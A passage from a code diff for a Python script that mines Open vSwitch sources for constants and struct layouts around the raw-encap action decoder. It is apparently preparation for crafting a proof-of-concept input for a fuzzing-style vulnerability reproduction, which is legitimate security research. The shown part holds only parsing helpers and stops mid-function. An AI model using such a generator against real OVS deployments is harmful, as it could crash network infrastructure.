@@ -2,165 +2,129 @@ import os
 import re
 import tarfile
 import struct
-import ast
-from typing import Dict, Optional, Tuple, List, Iterable
+from typing import Dict, List, Tuple, Optional, Iterable
 
 
-def _round_up(n: int, m: int) -> int:
-    return ((n + m - 1) // m) * m
+def _is_tar_path(p: str) -> bool:
+    lp = p.lower()
+    return os.path.isfile(p) and (lp.endswith(".tar") or lp.endswith(".tar.gz") or lp.endswith(".tgz") or lp.endswith(".tar.bz2") or lp.endswith(".tbz2") or lp.endswith(".tar.xz") or lp.endswith(".txz"))
 
 
-def _strip_c_comments(s: str) -> str:
-    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
-    s = re.sub(r"//.*?$", "", s, flags=re.M)
-    return s
-
-
-class _SafeIntEval(ast.NodeVisitor):
-    __slots__ = ("_names",)
-
-    def __init__(self, names: Dict[str, int]):
-        self._names = names
-
-    def visit(self, node):
-        if isinstance(node, ast.Expression):
-            return self.visit(node.body)
-        if isinstance(node, ast.Constant):
-            if isinstance(node.value, int):
-                return int(node.value)
-            if isinstance(node.value, str):
-                raise ValueError("string constant not allowed")
-            raise ValueError("unsupported constant")
-        if isinstance(node, ast.UnaryOp):
-            v = self.visit(node.operand)
-            if isinstance(node.op, ast.UAdd):
-                return +v
-            if isinstance(node.op, ast.USub):
-                return -v
-            if isinstance(node.op, ast.Invert):
-                return ~v
-            raise ValueError("bad unary op")
-        if isinstance(node, ast.BinOp):
-            a = self.visit(node.left)
-            b = self.visit(node.right)
-            op = node.op
-            if isinstance(op, ast.Add):
-                return a + b
-            if isinstance(op, ast.Sub):
-                return a - b
-            if isinstance(op, ast.Mult):
-                return a * b
-            if isinstance(op, ast.FloorDiv):
-                return a // b
-            if isinstance(op, ast.Div):
-                return a // b
-            if isinstance(op, ast.Mod):
-                return a % b
-            if isinstance(op, ast.LShift):
-                return a << b
-            if isinstance(op, ast.RShift):
-                return a >> b
-            if isinstance(op, ast.BitOr):
-                return a | b
-            if isinstance(op, ast.BitAnd):
-                return a & b
-            if isinstance(op, ast.BitXor):
-                return a ^ b
-            raise ValueError("bad bin op")
-        if isinstance(node, ast.Name):
-            if node.id in self._names:
-                return int(self._names[node.id])
-            raise ValueError(f"unknown name: {node.id}")
-        if isinstance(node, ast.ParenExpr):  # python 3.12+
-            return self.visit(node.expression)
-        raise ValueError(f"unsupported node: {type(node).__name__}")
-
-
-def _eval_c_int_expr(expr: str, known: Optional[Dict[str, int]] = None) -> int:
-    if known is None:
-        known = {}
-    e = expr.strip()
-    e = re.sub(r"\b(ULL|LLU|UL|LU|U|L)\b", "", e)
-    e = re.sub(r"\(\s*[A-Za-z_]\w*\s*\)", "", e)
-    e = re.sub(r"\bsizeof\s*\([^)]*\)", "0", e)
-    e = re.sub(r"\s+", " ", e).strip()
-    if not e:
-        raise ValueError("empty expr")
-    try:
-        tree = ast.parse(e, mode="eval")
-        return int(_SafeIntEval(known).visit(tree))
-    except Exception:
-        m = re.fullmatch(r"0[xX][0-9a-fA-F]+|\d+", e)
-        if m:
-            return int(e, 0)
-        raise
-
-
-def _read_source_texts(src_path: str) -> Dict[str, str]:
-    texts: Dict[str, str] = {}
-
-    def add_file(path_key: str, data: bytes) -> None:
-        try:
-            txt = data.decode("utf-8", "ignore")
-        except Exception:
-            txt = data.decode("latin-1", "ignore")
-        texts[path_key] = txt
-
+def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
     if os.path.isdir(src_path):
         for root, _, files in os.walk(src_path):
             for fn in files:
-                ext = os.path.splitext(fn)[1].lower()
-                if ext not in (".c", ".h", ".cc", ".cpp", ".inc", ".in", ".hpp"):
+                lfn = fn.lower()
+                if not (lfn.endswith(".c") or lfn.endswith(".h") or lfn.endswith(".cc") or lfn.endswith(".hh") or lfn.endswith(".cpp") or lfn.endswith(".hpp")):
                     continue
-                p = os.path.join(root, fn)
+                path = os.path.join(root, fn)
                 try:
-                    st = os.stat(p)
-                except OSError:
-                    continue
-                if st.st_size > 5_000_000:
-                    continue
-                try:
-                    with open(p, "rb") as f:
-                        add_file(os.path.relpath(p, src_path), f.read())
-                except OSError:
-                    continue
-        return texts
-
-    try:
-        with tarfile.open(src_path, "r:*") as tf:
-            for m in tf.getmembers():
-                if not m.isfile():
-                    continue
-                ext = os.path.splitext(m.name)[1].lower()
-                if ext not in (".c", ".h", ".cc", ".cpp", ".inc", ".in", ".hpp"):
-                    continue
-                if m.size > 5_000_000:
-                    continue
-                try:
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    add_file(m.name, f.read())
+                    with open(path, "rb") as f:
+                        data = f.read()
+                    rel = os.path.relpath(path, src_path).replace("\\", "/")
+                    yield rel, data
                 except Exception:
                     continue
+        return
+
+    if _is_tar_path(src_path):
+        try:
+            with tarfile.open(src_path, "r:*") as tf:
+                for m in tf.getmembers():
+                    if not m.isfile():
+                        continue
+                    name = m.name
+                    lname = name.lower()
+                    if not (lname.endswith(".c") or lname.endswith(".h") or lname.endswith(".cc") or lname.endswith(".hh") or lname.endswith(".cpp") or lname.endswith(".hpp")):
+                        continue
+                    if m.size > 8 * 1024 * 1024:
+                        continue
+                    try:
+                        f = tf.extractfile(m)
+                        if not f:
+                            continue
+                        data = f.read()
+                        yield name, data
+                    except Exception:
+                        continue
+        except Exception:
+            return
+
+
+def _decode_text(b: bytes) -> str:
+    try:
+        return b.decode("utf-8", errors="ignore")
     except Exception:
-        pass
-
-    return texts
+        return b.decode("latin-1", errors="ignore")
 
 
-def _find_text_by_pred(texts: Dict[str, str], pred) -> Optional[Tuple[str, str]]:
-    for k, v in texts.items():
-        if pred(k, v):
-            return k, v
-    return None
+def _strip_c_comments(s: str) -> str:
+    out = []
+    i = 0
+    n = len(s)
+    state = 0  # 0 normal, 1 line, 2 block, 3 string, 4 char
+    while i < n:
+        c = s[i]
+        if state == 0:
+            if c == '"' and (i == 0 or s[i - 1] != "\\"):
+                out.append(c)
+                state = 3
+                i += 1
+                continue
+            if c == "'" and (i == 0 or s[i - 1] != "\\"):
+                out.append(c)
+                state = 4
+                i += 1
+                continue
+            if c == "/" and i + 1 < n:
+                c2 = s[i + 1]
+                if c2 == "/":
+                    state = 1
+                    i += 2
+                    continue
+                if c2 == "*":
+                    state = 2
+                    i += 2
+                    continue
+            out.append(c)
+            i += 1
+        elif state == 1:
+            if c == "\n":
+                out.append(c)
+                state = 0
+            i += 1
+        elif state == 2:
+            if c == "*" and i + 1 < n and s[i + 1] == "/":
+                state = 0
+                i += 2
+            else:
+                i += 1
+        elif state == 3:
+            out.append(c)
+            if c == '"' and (i == 0 or s[i - 1] != "\\"):
+                state = 0
+            i += 1
+        else:
+            out.append(c)
+            if c == "'" and (i == 0 or s[i - 1] != "\\"):
+                state = 0
+            i += 1
+    return "".join(out)
 
 
-def _extract_brace_block(text: str, open_brace_pos: int) -> Optional[Tuple[int, int]]:
-    if open_brace_pos < 0 or open_brace_pos >= len(text) or text[open_brace_pos] != "{":
+def _extract_function(text: str, func_name: str) -> Optional[str]:
+    idx = text.find(func_name)
+    if idx < 0:
         return None
+    m = re.search(r"\b" + re.escape(func_name) + r"\b\s*\(", text[idx:])
+    if not m:
+        return None
+    start = idx + m.start()
+    brace = text.find("{", start)
+    if brace < 0:
+        return None
+    i = brace
     depth = 0
-    i = open_brace_pos
     n = len(text)
     while i < n:
         c = text[i]
@@ -169,535 +133,580 @@ def _extract_brace_block(text: str, open_brace_pos: int) -> Optional[Tuple[int, 
         elif c == "}":
             depth -= 1
             if depth == 0:
-                return open_brace_pos, i + 1
+                return text[brace:i + 1]
         i += 1
     return None
 
 
-def _extract_function(text: str, func_name: str) -> Optional[str]:
-    s = _strip_c_comments(text)
-    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\([^;{]*\)\s*\{", re.M)
-    m = pat.search(s)
-    if not m:
-        return None
-    brace_pos = s.find("{", m.end() - 1)
-    blk = _extract_brace_block(s, brace_pos)
-    if not blk:
-        return None
-    a, b = blk
-    return s[a:b]
-
-
-def _extract_struct_body(text: str, struct_name: str) -> Optional[str]:
-    s = _strip_c_comments(text)
-    m = re.search(r"\bstruct\s+" + re.escape(struct_name) + r"\s*\{", s)
-    if not m:
-        return None
-    brace_pos = s.find("{", m.end() - 1)
-    blk = _extract_brace_block(s, brace_pos)
-    if not blk:
-        return None
-    a, b = blk
-    return s[a + 1 : b - 1]
-
-
-def _extract_enum_body_containing(text: str, identifier: str) -> Optional[str]:
-    s = _strip_c_comments(text)
-    for m in re.finditer(r"\benum\b[^{;]*\{", s):
-        brace_pos = s.find("{", m.end() - 1)
-        blk = _extract_brace_block(s, brace_pos)
-        if not blk:
-            continue
-        a, b = blk
-        body = s[a + 1 : b - 1]
-        if identifier in body:
-            return body
+def _find_ofp_actions_c(texts: Dict[str, str]) -> Optional[str]:
+    best = None
+    for name in texts:
+        ln = name.lower()
+        if ln.endswith("ofp-actions.c") or ln.endswith("/ofp-actions.c") or ln.endswith("\\ofp-actions.c"):
+            best = name
+            break
+    if best:
+        return best
+    for name, t in texts.items():
+        if "decode_NXAST_RAW_ENCAP" in t or "decode_ed_prop" in t:
+            if "ofp-actions.c" in name.lower():
+                return name
+    for name, t in texts.items():
+        if "decode_NXAST_RAW_ENCAP" in t and "ofp-actions" in name.lower():
+            return name
     return None
 
 
-def _parse_enum_body(body: str) -> Dict[str, int]:
-    b = body
-    b = re.sub(r"\s+", " ", b).strip()
-    parts = [p.strip() for p in b.split(",")]
-    out: Dict[str, int] = {}
-    cur = -1
-    known: Dict[str, int] = {}
-    for item in parts:
-        if not item:
+def _collect_relevant_texts(src_path: str) -> Dict[str, str]:
+    keys = (
+        b"decode_NXAST_RAW_ENCAP",
+        b"decode_ed_prop",
+        b"NXAST_RAW_ENCAP",
+        b"NX_VENDOR_ID",
+        b"NX_VENDOR",
+        b"OFPEDPT_",
+        b"ofp_ed_prop",
+        b"nx_action_raw_encap",
+        b"RAW_ENCAP",
+        b"ed_prop",
+        b"encap",
+    )
+    out: Dict[str, str] = {}
+    for name, data in _iter_source_files(src_path):
+        if not any(k in data for k in keys):
             continue
-        if item.startswith("}"):
-            break
-        item = item.strip()
-        item = re.sub(r"\b__attribute__\s*\(\([^)]*\)\)", "", item).strip()
-        m = re.match(r"^([A-Za-z_]\w*)\s*(?:=\s*(.+))?$", item)
-        if not m:
-            continue
-        name = m.group(1)
-        expr = m.group(2)
-        if expr is None:
-            val = cur + 1
-        else:
-            expr = expr.strip()
-            expr = re.sub(r"\s*\}\s*$", "", expr).strip()
-            try:
-                val = _eval_c_int_expr(expr, known)
-            except Exception:
-                try:
-                    val = int(expr, 0)
-                except Exception:
-                    val = cur + 1
-        out[name] = int(val)
-        known[name] = int(val)
-        cur = int(val)
+        out[name] = _decode_text(data)
     return out
 
 
-def _resolve_identifier(name: str, texts: Dict[str, str], default: Optional[int] = None) -> Optional[int]:
-    define_pat = re.compile(r"^\s*#\s*define\s+" + re.escape(name) + r"\s+(.+?)\s*$", re.M)
-    for _, txt in texts.items():
-        if name not in txt:
-            continue
-        s = _strip_c_comments(txt)
-        m = define_pat.search(s)
-        if m:
-            expr = m.group(1).strip()
-            expr = re.sub(r"\s*/\*.*$", "", expr).strip()
-            expr = re.sub(r"\s*//.*$", "", expr).strip()
-            if expr.startswith("(") and expr.endswith(")"):
-                expr = expr[1:-1].strip()
-            try:
-                return _eval_c_int_expr(expr)
-            except Exception:
-                try:
-                    return int(expr, 0)
-                except Exception:
-                    pass
-
-    assign_pat = re.compile(r"\b" + re.escape(name) + r"\b\s*=\s*([^,}]+)")
-    for _, txt in texts.items():
-        if name not in txt:
-            continue
-        s = _strip_c_comments(txt)
-        m = assign_pat.search(s)
-        if m:
-            expr = m.group(1).strip()
-            try:
-                return _eval_c_int_expr(expr)
-            except Exception:
-                try:
-                    return int(expr, 0)
-                except Exception:
-                    pass
-
-    for _, txt in texts.items():
-        if name not in txt:
-            continue
-        body = _extract_enum_body_containing(txt, name)
-        if body:
-            mp = _parse_enum_body(body)
-            if name in mp:
-                return mp[name]
-
-    return default
+def _sanitize_expr(expr: str) -> str:
+    expr = expr.strip()
+    expr = re.sub(r"\bUINT(?:8|16|32|64)_C\s*\(", "(", expr)
+    expr = re.sub(r"\bINT(?:8|16|32|64)_C\s*\(", "(", expr)
+    expr = re.sub(r"\bhtons\s*\(", "(", expr)
+    expr = re.sub(r"\bhtonl\s*\(", "(", expr)
+    expr = re.sub(r"\bntohs\s*\(", "(", expr)
+    expr = re.sub(r"\bntohl\s*\(", "(", expr)
+    expr = re.sub(r"\b(?:u?int(?:8|16|32|64)_t|size_t|ssize_t|long|short|unsigned|signed|int|char|bool|ovs_be(?:16|32|64))\b", "", expr)
+    expr = re.sub(r"\(\s*\)", "", expr)
+    expr = re.sub(r"\b([0-9A-Fa-fx]+)\s*([uUlL]+)\b", r"\1", expr)
+    expr = expr.strip()
+    return expr
 
 
-def _resolve_struct_size(struct_name: str, texts: Dict[str, str], cache: Dict[str, int]) -> Optional[int]:
-    if struct_name in cache:
-        return cache[struct_name]
-
-    for _, txt in texts.items():
-        if f"struct {struct_name}" not in txt:
-            continue
-        s = _strip_c_comments(txt)
-        m = re.search(
-            r"sizeof\s*\(\s*struct\s+" + re.escape(struct_name) + r"\s*\)\s*==\s*(\d+)",
-            s,
-        )
-        if m:
-            cache[struct_name] = int(m.group(1))
-            return cache[struct_name]
-
-    body = None
-    for _, txt in texts.items():
-        if f"struct {struct_name}" not in txt:
-            continue
-        body = _extract_struct_body(txt, struct_name)
-        if body is not None:
-            break
-    if body is None:
+def _safe_eval_int(expr: str, consts: Dict[str, int]) -> Optional[int]:
+    expr = _sanitize_expr(expr)
+    if not expr:
         return None
 
-    field_decls = [d.strip() for d in body.split(";")]
-    size = 0
-    for decl in field_decls:
-        if not decl:
-            continue
-        decl = decl.strip()
-        if decl.startswith("#"):
-            continue
-        decl = re.sub(r"\bOVS_PACKED\b", "", decl).strip()
-        if "{" in decl or "}" in decl:
-            continue
-        if ":" in decl:
-            decl = decl.split(":", 1)[0].strip()
-        if not decl:
-            continue
+    def repl_id(m: re.Match) -> str:
+        ident = m.group(0)
+        if ident in consts:
+            return str(consts[ident])
+        return ident
 
-        multi = [x.strip() for x in decl.split(",") if x.strip()]
-        if len(multi) > 1:
-            first = multi[0]
-            m1 = re.match(r"^(.*\S)\s+([A-Za-z_]\w*)(\s*\[\s*(\d+)\s*\])?$", first)
-            if not m1:
+    expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_id, expr)
+    if re.search(r"\b[A-Za-z_]\w*\b", expr2):
+        return None
+    if not re.fullmatch(r"[0-9xXa-fA-F \t\(\)\+\-\*/%<>&\|\^~.,]+", expr2):
+        return None
+    expr2 = expr2.replace(",", "")
+    try:
+        v = eval(expr2, {"__builtins__": None}, {})
+        if isinstance(v, int):
+            return v
+        if isinstance(v, bool):
+            return int(v)
+        return None
+    except Exception:
+        return None
+
+
+def _build_constants(texts: Dict[str, str]) -> Dict[str, int]:
+    consts: Dict[str, int] = {}
+    defines_expr: Dict[str, str] = {}
+    enum_exprs: List[List[Tuple[str, Optional[str]]]] = []
+
+    for t in texts.values():
+        tc = _strip_c_comments(t)
+        for line in tc.splitlines():
+            if "#define" not in line:
                 continue
-            base_type = m1.group(1).strip()
-            items = [first] + multi[1:]
-            for it in items:
-                if it is first:
-                    type_part = base_type
-                    name_part = m1.group(2)
-                    arrn = m1.group(4)
+            m = re.match(r"^\s*#\s*define\s+([A-Z_][A-Z0-9_]*)\s*(\(([^)]*)\))?\s+(.*)$", line)
+            if not m:
+                continue
+            name = m.group(1)
+            if m.group(2) is not None:
+                continue
+            expr = m.group(4).strip()
+            if not expr:
+                continue
+            if expr.startswith("\\"):
+                continue
+            expr = expr.split("\\")[0].strip()
+            defines_expr[name] = expr
+
+        # enums
+        idx = 0
+        while True:
+            m = re.search(r"\benum\b", tc[idx:])
+            if not m:
+                break
+            epos = idx + m.start()
+            brace = tc.find("{", epos)
+            if brace < 0:
+                idx = epos + 4
+                continue
+            # quick sanity: must have '}' after
+            close = tc.find("}", brace)
+            if close < 0:
+                idx = brace + 1
+                continue
+            # match braces
+            i = brace
+            depth = 0
+            n = len(tc)
+            while i < n:
+                if tc[i] == "{":
+                    depth += 1
+                elif tc[i] == "}":
+                    depth -= 1
+                    if depth == 0:
+                        close = i
+                        break
+                i += 1
+            inside = tc[brace + 1:close]
+            idx = close + 1
+
+            if len(inside) > 200000:
+                continue
+            parts = [p.strip() for p in inside.split(",")]
+            enum_items: List[Tuple[str, Optional[str]]] = []
+            for p in parts:
+                if not p:
+                    continue
+                if p.startswith("#"):
+                    continue
+                m2 = re.match(r"^([A-Za-z_]\w*)(?:\s*=\s*(.+))?$", p, flags=re.S)
+                if not m2:
+                    continue
+                nm = m2.group(1)
+                ex = m2.group(2).strip() if m2.group(2) else None
+                enum_items.append((nm, ex))
+            if enum_items:
+                enum_exprs.append(enum_items)
+
+    # Iteratively resolve defines
+    progress = True
+    for _ in range(40):
+        if not progress:
+            break
+        progress = False
+        for k, ex in list(defines_expr.items()):
+            if k in consts:
+                continue
+            v = _safe_eval_int(ex, consts)
+            if v is not None:
+                consts[k] = int(v)
+                progress = True
+
+    # Resolve enums in order, allowing references
+    for items in enum_exprs:
+        prev = None
+        for nm, ex in items:
+            if ex is None:
+                if prev is None:
+                    prev = 0
                 else:
-                    m2 = re.match(r"^([A-Za-z_]\w*)(\s*\[\s*(\d+)\s*\])?$", it)
-                    if not m2:
-                        continue
-                    type_part = base_type
-                    name_part = m2.group(1)
-                    arrn = m2.group(3)
-                if name_part in ("props", "properties"):
-                    cache[struct_name] = size
-                    return size
-                fsz = _type_size(type_part, texts, cache)
-                if fsz is None:
-                    fsz = 4
-                if arrn:
-                    size += fsz * int(arrn)
-                else:
-                    size += fsz
-            continue
+                    prev += 1
+                if nm not in consts:
+                    consts[nm] = prev
+            else:
+                v = _safe_eval_int(ex, consts)
+                if v is None:
+                    continue
+                prev = int(v)
+                if nm not in consts:
+                    consts[nm] = prev
 
-        m = re.match(r"^(.*\S)\s+([A-Za-z_]\w*)(\s*\[\s*(\d+)\s*\])?$", decl)
-        if not m:
-            continue
-        type_part = m.group(1).strip()
-        name_part = m.group(2).strip()
-        arrn = m.group(4)
+    # Another pass for defines after enums
+    progress = True
+    for _ in range(60):
+        if not progress:
+            break
+        progress = False
+        for k, ex in list(defines_expr.items()):
+            if k in consts:
+                continue
+            v = _safe_eval_int(ex, consts)
+            if v is not None:
+                consts[k] = int(v)
+                progress = True
 
-        if name_part in ("props", "properties") and (arrn is None or arrn == "0"):
-            cache[struct_name] = size
-            return size
-
-        fsz = _type_size(type_part, texts, cache)
-        if fsz is None:
-            fsz = 4
-        if arrn:
-            size += fsz * int(arrn)
-        else:
-            size += fsz
-
-    cache[struct_name] = size
-    return size
+    return consts
 
 
-def _type_size(type_str: str, texts: Dict[str, str], cache: Dict[str, int]) -> Optional[int]:
-    t = type_str.strip()
-    t = re.sub(r"\bconst\b", "", t)
-    t = re.sub(r"\bvolatile\b", "", t)
-    t = re.sub(r"\brestrict\b", "", t)
-    t = t.replace("*", " ").strip()
-    t = re.sub(r"\s+", " ", t)
-
-    if t.startswith("struct "):
-        sn = t.split(" ", 1)[1].strip()
-        if sn in cache:
-            return cache[sn]
-        if sn == "nx_action_header":
-            cache[sn] = 16
-            return 16
-        if sn == "ofp_ed_prop_header":
-            cache[sn] = 4
-            return 4
-        sz = _resolve_struct_size(sn, texts, cache)
-        if sz is not None:
-            cache[sn] = sz
-            return sz
-        return None
-
-    base = {
-        "uint8_t": 1,
-        "int8_t": 1,
-        "char": 1,
-        "unsigned char": 1,
-        "uint16_t": 2,
-        "int16_t": 2,
-        "short": 2,
-        "unsigned short": 2,
-        "ovs_be16": 2,
-        "uint32_t": 4,
-        "int32_t": 4,
-        "int": 4,
-        "unsigned": 4,
-        "unsigned int": 4,
-        "ovs_be32": 4,
-        "uint64_t": 8,
-        "int64_t": 8,
-        "long long": 8,
-        "unsigned long long": 8,
-        "ovs_be64": 8,
-        "ovs_be128": 16,
-        "ofp_port_t": 4,
-        "ovs_be16_t": 2,
-        "ovs_be32_t": 4,
-        "ovs_be64_t": 8,
-        "bool": 1,
-        "_Bool": 1,
-    }
-    if t in base:
-        return base[t]
-    if t.endswith("_t") and t in base:
-        return base[t]
-    if t.startswith("ovs_be") and t[6:].isdigit():
-        n = int(t[6:])
-        if n % 8 == 0:
-            return n // 8
-    if t.startswith("enum "):
-        return 4
-    if t.startswith("union "):
-        return None
-    if t.startswith("signed ") or t.startswith("unsigned "):
-        if t in base:
-            return base[t]
+def _find_token_expr(texts: Dict[str, str], token: str) -> Optional[str]:
+    pat_define = re.compile(r"^\s*#\s*define\s+" + re.escape(token) + r"\s+(.+?)\s*$", re.M)
+    pat_enum = re.compile(r"\b" + re.escape(token) + r"\b\s*=\s*([^,}]+)")
+    for t in texts.values():
+        tc = _strip_c_comments(t)
+        m = pat_define.search(tc)
+        if m:
+            return m.group(1).strip()
+    for t in texts.values():
+        tc = _strip_c_comments(t)
+        m = pat_enum.search(tc)
+        if m:
+            return m.group(1).strip()
     return None
 
 
-def _infer_fuzzer_mode(texts: Dict[str, str]) -> str:
-    fuzz_files: List[Tuple[str, str]] = []
-    for k, v in texts.items():
-        if "LLVMFuzzerTestOneInput" in v:
-            fuzz_files.append((k, v))
-    if not fuzz_files:
-        return "actions_only"
-
-    best = None
-    best_score = -1
-    for k, v in fuzz_files:
-        score = 0
-        if "ofpact" in v or "ofp-actions" in v or "ofp_actions" in v:
-            score += 3
-        if "decode" in v:
-            score += 1
-        if "raw_encap" in v or "RAW_ENCAP" in v:
-            score += 5
-        if score > best_score:
-            best = (k, v)
-            best_score = score
-
-    if best is None:
-        best = fuzz_files[0]
-    _, code = best
-
-    if re.search(r"\bofp_?version\b", code) and (
-        re.search(r"\bdata\s*\[\s*0\s*\]", code) or "ConsumeIntegralInRange" in code
-    ):
-        return "version_prefixed"
-
-    if "FuzzedDataProvider" in code and re.search(r"ConsumeIntegral.*version", code):
-        return "version_prefixed"
-
-    if "ofpraw_pull" in code or "ofpmsg" in code:
-        return "ofp_message"
-
-    return "actions_only"
-
-
-def _choose_ed_prop_from_decode(ofp_actions_text: str, texts: Dict[str, str]) -> Tuple[int, int]:
-    func = _extract_function(ofp_actions_text, "decode_ed_prop")
-    if not func:
-        func = _extract_function(ofp_actions_text, "decode_ed_props")
-    cache: Dict[str, int] = {"nx_action_header": 16, "ofp_ed_prop_header": 4}
-
-    if not func:
-        return 1, 8
-
-    func_nc = _strip_c_comments(func)
-    cases = [(m.group(1), m.start()) for m in re.finditer(r"\bcase\s+([A-Za-z_]\w*)\s*:", func_nc)]
+def _choose_prop_token(decode_ed_prop_func: Optional[str]) -> Optional[str]:
+    if not decode_ed_prop_func:
+        return None
+    body = _strip_c_comments(decode_ed_prop_func)
+    cases = re.findall(r"\bcase\s+([A-Za-z_]\w*)\s*:", body)
     if not cases:
-        return 1, 8
-    cases.sort(key=lambda x: x[1])
+        return None
+    for c in cases:
+        uc = c.upper()
+        if "RAW" in uc and ("ED" in uc or "PROP" in uc or "PT" in uc):
+            return c
+    for c in cases:
+        uc = c.upper()
+        if "RAW" in uc:
+            return c
+    for c in cases:
+        uc = c.upper()
+        if "EXPERIMENTER" not in uc and "EXP" not in uc and "PAD" not in uc:
+            return c
+    return cases[0]
 
-    case_blocks: List[Tuple[str, str]] = []
-    for i, (nm, pos) in enumerate(cases):
-        end = cases[i + 1][1] if i + 1 < len(cases) else len(func_nc)
-        block = func_nc[pos:end]
-        case_blocks.append((nm, block))
 
-    def struct_from_block(block: str) -> Optional[str]:
-        m = re.search(r"\bstruct\s+(ofp_ed_prop_[A-Za-z0-9_]+)\b", block)
-        if m:
-            return m.group(1)
-        m = re.search(r"\bstruct\s+(nx_ed_prop_[A-Za-z0-9_]+)\b", block)
-        if m:
-            return m.group(1)
-        m = re.search(r"\bstruct\s+(ofp15_ed_prop_[A-Za-z0-9_]+)\b", block)
-        if m:
-            return m.group(1)
+class _CStructDB:
+    def __init__(self, texts: Dict[str, str]):
+        self.texts = texts
+        self.def_cache: Dict[str, str] = {}
+        self.fields_cache: Dict[str, List[Tuple[str, str, int]]] = {}
+        self.size_cache: Dict[str, int] = {}
+
+    def _find_struct_def(self, name: str) -> Optional[str]:
+        if name in self.def_cache:
+            return self.def_cache[name]
+        pat = re.compile(r"\bstruct\s+" + re.escape(name) + r"\b")
+        for t in self.texts.values():
+            tc = _strip_c_comments(t)
+            for m in pat.finditer(tc):
+                pos = m.start()
+                brace = tc.find("{", pos)
+                if brace < 0 or brace - pos > 400:
+                    continue
+                # match braces
+                i = brace
+                depth = 0
+                n = len(tc)
+                while i < n:
+                    if tc[i] == "{":
+                        depth += 1
+                    elif tc[i] == "}":
+                        depth -= 1
+                        if depth == 0:
+                            block = tc[brace + 1:i]
+                            self.def_cache[name] = block
+                            return block
+                    i += 1
+        self.def_cache[name] = ""
         return None
 
-    prio_keywords = ("RAW", "HEADER", "DATA", "BYTES", "PAYLOAD", "PUSH", "POP", "L2", "ETH", "PORT")
-    ordered = sorted(case_blocks, key=lambda x: sum(1 for kw in prio_keywords if kw in x[0]), reverse=True)
-
-    for nm, block in ordered:
-        st = struct_from_block(block)
-        val = _resolve_identifier(nm, texts)
-        if val is None:
-            continue
-        wire_len = None
-        if st:
-            wire_len = _resolve_struct_size(st, texts, cache)
-        if wire_len is None:
-            mlen = re.search(r"\b(?:len|prop_len|property_len)\b\s*(?:==|!=|<|<=|>=|>)\s*(\d+)", block)
-            if mlen:
-                wire_len = int(mlen.group(1))
-        if wire_len is None:
-            wire_len = 8
-        wire_len = int(wire_len)
-        if wire_len < 4:
-            continue
-        if wire_len > 256:
-            continue
-        if wire_len % 2 != 0:
-            continue
-        if wire_len < 8:
-            continue
-        return int(val) & 0xFFFF, wire_len
-
-    nm, _ = ordered[0]
-    val = _resolve_identifier(nm, texts, default=1)
-    return int(val) & 0xFFFF, 8
-
-
-def _resolve_raw_encap_base(texts: Dict[str, str]) -> int:
-    cache: Dict[str, int] = {"nx_action_header": 16, "ofp_ed_prop_header": 4}
-    for _, txt in texts.items():
-        if "struct nx_action_raw_encap" not in txt:
-            continue
-        body = _extract_struct_body(txt, "nx_action_raw_encap")
-        if body is None:
-            continue
-        # Compute offset of props/properties field.
-        decls = [d.strip() for d in _strip_c_comments(body).split(";")]
-        sz = 0
-        for decl in decls:
-            if not decl or decl.startswith("#"):
+    def _parse_fields(self, name: str) -> Optional[List[Tuple[str, str, int]]]:
+        if name in self.fields_cache:
+            return self.fields_cache[name]
+        block = self._find_struct_def(name)
+        if not block:
+            self.fields_cache[name] = []
+            return None
+        b = block
+        b = re.sub(r"^\s*#.*$", "", b, flags=re.M)
+        stmts = [s.strip() for s in b.split(";")]
+        fields: List[Tuple[str, str, int]] = []
+        for st in stmts:
+            if not st:
                 continue
-            decl = decl.strip()
-            if "{" in decl or "}" in decl:
+            if st.startswith("union ") or st.startswith("struct ") and "{" in st:
                 continue
-            decl = re.sub(r"\bOVS_PACKED\b", "", decl).strip()
-            if ":" in decl:
-                decl = decl.split(":", 1)[0].strip()
-            if not decl:
-                continue
-            m = re.match(r"^(.*\S)\s+([A-Za-z_]\w*)\s*(\[\s*(\d*)\s*\])?$", decl)
+            st = re.sub(r"\s+", " ", st).strip()
+            m = re.match(r"^(.*?)\s+(.+)$", st)
             if not m:
                 continue
-            t = m.group(1).strip()
-            name = m.group(2).strip()
-            arr = m.group(4)
-            if name in ("props", "properties"):
-                return sz
-            fsz = _type_size(t, texts, cache)
-            if fsz is None:
-                fsz = 4
-            if arr is not None and arr != "":
-                sz += fsz * int(arr)
-            elif arr == "":
-                return sz
+            ctype = m.group(1).strip()
+            vars_part = m.group(2).strip()
+            if ctype.startswith("OVS_") or ctype.startswith("__"):
+                continue
+            for v in [x.strip() for x in vars_part.split(",")]:
+                v = v.replace("*", " ").strip()
+                vm = re.match(r"^([A-Za-z_]\w*)\s*\[\s*(\d*)\s*\]$", v)
+                if vm:
+                    vn = vm.group(1)
+                    ln = vm.group(2)
+                    if ln == "":
+                        count = 0
+                    else:
+                        try:
+                            count = int(ln, 0)
+                        except Exception:
+                            count = 0
+                    fields.append((ctype, vn, count))
+                else:
+                    vm2 = re.match(r"^([A-Za-z_]\w*)$", v)
+                    if vm2:
+                        fields.append((ctype, vm2.group(1), 1))
+        self.fields_cache[name] = fields
+        return fields
+
+    def sizeof_type(self, ctype: str) -> Optional[int]:
+        ctype = ctype.strip()
+        ctype = re.sub(r"\b(const|volatile|register|static)\b", "", ctype).strip()
+        ctype = re.sub(r"\s+", " ", ctype)
+        if ctype.startswith("struct "):
+            sn = ctype.split(" ", 1)[1].strip()
+            return self.sizeof_struct(sn)
+        if ctype.startswith("enum "):
+            return 4
+        base = ctype
+        mapping = {
+            "uint8_t": 1,
+            "int8_t": 1,
+            "char": 1,
+            "unsigned char": 1,
+            "ovs_u8": 1,
+            "uint16_t": 2,
+            "int16_t": 2,
+            "ovs_be16": 2,
+            "ovs_u16": 2,
+            "uint32_t": 4,
+            "int32_t": 4,
+            "ovs_be32": 4,
+            "ovs_u32": 4,
+            "uint64_t": 8,
+            "int64_t": 8,
+            "ovs_be64": 8,
+            "ovs_u64": 8,
+        }
+        if base in mapping:
+            return mapping[base]
+        return None
+
+    def sizeof_struct(self, name: str) -> Optional[int]:
+        if name in self.size_cache:
+            return self.size_cache[name]
+        fields = self._parse_fields(name)
+        if not fields:
+            self.size_cache[name] = 0
+            return None
+        sz = 0
+        for ctype, _, count in fields:
+            if count == 0:
+                continue
+            ts = self.sizeof_type(ctype)
+            if ts is None:
